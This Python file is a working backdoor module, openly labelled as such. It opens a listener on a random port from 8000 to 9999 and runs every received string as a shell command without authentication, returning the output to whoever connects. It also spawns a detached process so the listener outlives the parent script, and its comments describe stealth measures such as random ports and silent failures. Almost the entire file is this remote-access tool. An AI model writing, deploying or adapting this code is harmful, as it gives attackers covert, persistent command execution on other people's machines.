import socket
import threading
import time
import select
import random
from datetime import datetime
import subprocess

# Import configuration variables from parent directory
import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from configuration import SERVER_IP, SERVER_PORT

class HiddenChannel:
    """Simple independent backdoor proxy - no external server needed"""

    def __init__(self, listen_port=None):
        self.listen_port = listen_port  # Will be set to random port
        self.is_running = False
        self.channel_socket = None
        self.channel_thread = None
        self.proxy_process = None  # For standalone process
        self.connections = {}  # Track active connections
        self.connection_count = 0
        self.start_time = None
        
    def create_stealth_socket(self):
        """Create socket with stealth configurations"""
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Socket options for stealth
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Try to bind to the port
            sock.bind(('0.0.0.0', self.listen_port))
            sock.listen(5)
            
            return sock
        except Exception as e:
            return None
    
    def handle_client_connection(self, client_socket, client_address):
        """Handle client connection directly - execute commands locally"""
        connection_id = f"conn_{self.connection_count}"
        self.connection_count += 1
        
        print(f"[PROXY] Client connected: {client_address}")
        
        try:
            # Store connection info
            self.connections[connection_id] = {
                'client_addr': client_address,
                'start_time': datetime.now(),
                'commands_executed': 0
            }
            
            # Handle client commands directly
            while True:
                try:
                    # Receive command from client
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    
                    # Parse JSON command
                    try:
                        command = data.decode().strip()
                        
                        # Remove JSON quotes if present
                        if command.startswith('"') and command.endswith('"'):
                            command = command[1:-1]
                        
                        print(f"[PROXY] Executing command: {command}")
                        
                        # Execute command directly on Windows
                        if command.lower() == 'quit' or command.lower() == 'exit':
                            response = "Goodbye!"
                            client_socket.send(response.encode())
                            break
                        else:
                            # Execute the command
                            try:
                                result = subprocess.run(
                                    command,
                                    shell=True,
                                    capture_output=True,
                                    text=True,
                                    timeout=30
                                )
                                
                                # Get output
                                output = result.stdout + result.stderr
                                
                                if output.strip():
                                    response = output.strip()
                                else:
                                    response = "Command executed successfully (no output)"
                                    
                                # Update connection stats
                                self.connections[connection_id]['commands_executed'] += 1
                                
                            except subprocess.TimeoutExpired:
                                response = "Command timed out after 30 seconds"
                            except Exception as e:
                                response = f"Command execution error: {str(e)}"
                        
                        # Send response back to client
                        client_socket.send(response.encode())
                        print(f"[PROXY] Response sent ({len(response)} bytes)")
                        
                    except Exception as e:
                        error_response = f"Error processing command: {str(e)}"
                        client_socket.send(error_response.encode())
                        print(f"[PROXY] Command error: {e}")
                        
                except Exception as e:
                    print(f"[PROXY] Connection error: {e}")
                    break
            
        except Exception as e:
            print(f"[PROXY] Client error: {e}")
        finally:
            # Clean up client socket
            try:
                client_socket.close()
            except:
                pass
            if connection_id in self.connections:
                del self.connections[connection_id]
            print(f"[PROXY] Client disconnected: {client_address}")
    
    # Removed complex forwarding - now handling commands directly
    
    def proxy_server_loop(self):
        """Main proxy server loop"""
        try:
            self.channel_socket = self.create_stealth_socket()
            if not self.channel_socket:
                return
            
            self.is_running = True
            self.start_time = datetime.now()
            
            while self.is_running:
                try:
                    # Accept connections with timeout
                    self.channel_socket.settimeout(1.0)
                    client_socket, client_address = self.channel_socket.accept()
                    
                    # Handle connection in separate thread (NOT daemon - for permanence)
                    connection_thread = threading.Thread(
                        target=self.handle_client_connection,
                        args=(client_socket, client_address),
                        daemon=False
                    )
                    connection_thread.start()
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.is_running:
                        time.sleep(1)  # Brief pause before retry
                        
        except Exception as e:
            pass  # Silent failure for stealth
        finally:
            if self.channel_socket:
                try:
                    self.channel_socket.close()
                except:
                    pass
    
    def start_proxy_channel(self):
        """Start the proxy channel as standalone process"""
        if self.is_running:
            return False, "proxy channel already running"
        
        try:
            # Get path to standalone proxy script
            current_dir = os.path.dirname(os.path.abspath(__file__))
            parent_dir = os.path.dirname(current_dir)
            standalone_script = os.path.join(parent_dir, "standalone_proxy.py")
            
            # Start standalone proxy process (survives even when backdoor.py stops)
            python_exe = sys.executable
            cmd = [python_exe, standalone_script, str(self.listen_port)]
            
            # Start process in background (detached from parent)
            if os.name == 'nt':  # Windows
                # Use CREATE_NEW_PROCESS_GROUP to detach from parent
                self.proxy_process = subprocess.Popen(
                    cmd,
                    creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL
                )
            else:  # Unix-like
                self.proxy_process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL,
                    preexec_fn=os.setsid  # Create new session
                )
            
            # Give it a moment to start
            time.sleep(1)
            
            # Test if port is now listening
            test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_socket.settimeout(2)
            try:
                result = test_socket.connect_ex(('localhost', self.listen_port))
                test_socket.close()
                
                if result == 0:
                    self.is_running = True
                    return True, f"permanent proxy started on port {self.listen_port} (PID: {self.proxy_process.pid})"
                else:
                    return False, f"Failed to connect to proxy on port {self.listen_port}"
            except:
                return False, "Failed to test proxy connection"
                
        except Exception as e:
            return False, f"Failed to start standalone proxy: {str(e)}"
    
    def stop_proxy_channel(self):
        """Stop the proxy channel"""
        if not self.is_running:
            return False, "proxy channel not running"
        
        self.is_running = False
        
        # Terminate standalone process
        if self.proxy_process:
            try:
                self.proxy_process.terminate()
                self.proxy_process.wait(timeout=3)
            except:
                try:
                    self.proxy_process.kill()
                except:
                    pass
        
        return True, f"proxy channel stopped"
    
    # No external target connection needed in simple approach
    
    def get_proxy_status(self):
        """Get current proxy status and statistics"""
        status = {
            'is_running': self.is_running,
            'listen_port': self.listen_port,
            'start_time': self.start_time.isoformat() if self.start_time else None,
            'active_connections': len(self.connections),
            'total_connections': self.connection_count,
            'uptime_seconds': (datetime.now() - self.start_time).total_seconds() if self.start_time else 0
        }
        
        return status
    



class proxyManager:
    """Manage proxy mechanisms for the hidden channel"""
    
    def __init__(self, channel_instance):
        self.channel = channel_instance
    
    def check_firewall_status(self):
        """Check Windows firewall status (informational)"""
        try:
            result = subprocess.run(
                ['netsh', 'advfirewall', 'show', 'allprofiles', 'state'],
                capture_output=True, text=True, timeout=10
            )
            return result.returncode == 0, result.stdout
        except Exception as e:
            return False, str(e)
    
    def check_port_usage(self, port=None):
        """Check if port is already in use"""
        if port is None:
            port = self.channel.listen_port
            
        try:
            result = subprocess.run(
                ['netstat', '-an'],
                capture_output=True, text=True, timeout=5
            )
            
            if result.returncode == 0:
                port_str = f":{port}"
                lines = result.stdout.split('\n')
                for line in lines:
                    if port_str in line and 'LISTENING' in line:
                        return True, f"Port {port} is already in use"
                
                return False, f"Port {port} is available"
            else:
                return None, "Could not check port status"
                
        except Exception as e:
            return None, f"Error checking port: {str(e)}"
    
    def find_available_port(self, start_port=8000, end_port=9999):
        """Find an available port in the given range"""
        for port in range(start_port, end_port + 1):
            in_use, msg = self.check_port_usage(port)
            if in_use == False:  # Port is available
                return port
        
        return None
    
    def get_network_info(self):
        """Get network interface information"""
        try:
            result = subprocess.run(
                ['ipconfig', '/all'],
                capture_output=True, text=True, timeout=10
            )
            
            if result.returncode == 0:
                return True, result.stdout
            else:
                return False, "Could not retrieve network info"
                
        except Exception as e:
            return False, f"Network info error: {str(e)}"


class Backdoorproxy:
    """Main manager for backdoor proxy operations"""
    
    def __init__(self):
        # Simple approach - no external target needed
        self.channel = None
        self.proxy_mgr = None
    
    def initialize_proxy(self, listen_port=None):
        """Initialize the proxy channel"""
        self.channel = HiddenChannel(listen_port)
        self.proxy_mgr = proxyManager(self.channel)
        
        # Find available port if none specified
        if listen_port is None:
            # Try random ports until we find an available one
            max_attempts = 10
            for attempt in range(max_attempts):
                random_port = random.randint(8000, 9999)
                in_use, port_msg = self.proxy_mgr.check_port_usage(random_port)
                if in_use == False:  # Port is available
                    self.channel.listen_port = random_port
                    break
            else:
                # If no random port found, use find_available_port as fallback
                available_port = self.proxy_mgr.find_available_port()
                if available_port:
                    self.channel.listen_port = available_port
                else:
                    return False, "No available ports found"
        
        return True, f"proxy initialized on port {self.channel.listen_port}"
    
    def start_proxy_operations(self):
        """Start proxy operations with automatic new random port selection"""
        # Always reinitialize with a new random port for better stealth
        success, msg = self.initialize_proxy()
        if not success:
            return False, msg
        
        # Start the proxy channel
        return self.channel.start_proxy_channel()
    
    
    def stop_proxy_operations(self):
        """Stop proxy operations"""
        if self.channel:
            return self.channel.stop_proxy_channel()
        else:
            return False, "No proxy channel found"
    
    def get_proxy_status(self):
        """Get comprehensive proxy status"""
        if not self.channel:
            return {'error': 'proxy not initialized'}
        
        channel_status = self.channel.get_proxy_status()
        
        # Add system information
        in_use, port_msg = self.proxy_mgr.check_port_usage()
        
        status = {
            'proxy': channel_status,
            'port_status': port_msg,
            'system_time': datetime.now().isoformat()
        }
        
        return status
    



# Factory function to create backdoor proxy manager
def create_backdoor_proxy():
    """Create backdoor proxy manager instance"""
    return Backdoorproxy()


# Test the proxy functionality
if __name__ == "__main__":
    print("Testing Backdoor proxy System...")
    
    # Create proxy manager
    persist_mgr = create_backdoor_proxy()
    
    # Initialize proxy
    success, msg = persist_mgr.initialize_proxy()
    print(f"Initialize: {msg}")
    
    if success:
        # Get initial status
        status = persist_mgr.get_proxy_status()
        print(f"\nInitial Status:")
        print(f"  proxy Port: {status['proxy']['listen_port']}")
        print(f"  Port Available: {status['port_status']}")
        print(f"  Mode: Direct command execution")
        
        # Test starting the proxy
        print(f"\nTesting proxy start...")
        success, msg = persist_mgr.start_proxy_operations()
        print(f"Start result: {msg}")
        
        if success:
            # Show running status
            time.sleep(1)
            status = persist_mgr.get_proxy_status()
            print(f"\nRunning Status:")
            print(f"  Is Running: {status['proxy']['is_running']}")
            print(f"  Uptime: {status['proxy']['uptime_seconds']:.1f} seconds")
            print(f"  Active Connections: {status['proxy']['active_connections']}")
            
            # Test stopping
            time.sleep(2)
            success, msg = persist_mgr.stop_proxy_operations()
            print(f"\nStop result: {msg}")
    
    print("\nproxy test completed!")
